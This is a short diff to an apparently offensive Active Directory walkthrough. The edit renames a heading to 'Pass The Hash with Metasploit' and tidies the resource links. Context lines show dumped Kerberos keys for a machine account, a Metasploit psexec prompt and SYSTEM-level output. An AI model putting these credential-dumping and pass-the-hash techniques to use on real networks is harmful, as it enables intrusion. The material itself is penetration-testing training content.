@@ -467,7 +467,7 @@ EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
 EXCH01$:des-cbc-md5:8c45f44c16975129
 [*] Cleaning up... 
 ```
-##Pass The Hash
+## Pass The Hash with Metasploit
 ```console
 msf5 exploit(windows/smb/psexec) > options
 
@@ -531,7 +531,6 @@ nt authority\system
 
 ## Resources:
 [https://securityonline.info/aclpwn/](https://securityonline.info/aclpwn/)
-
 [https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/)
 
 
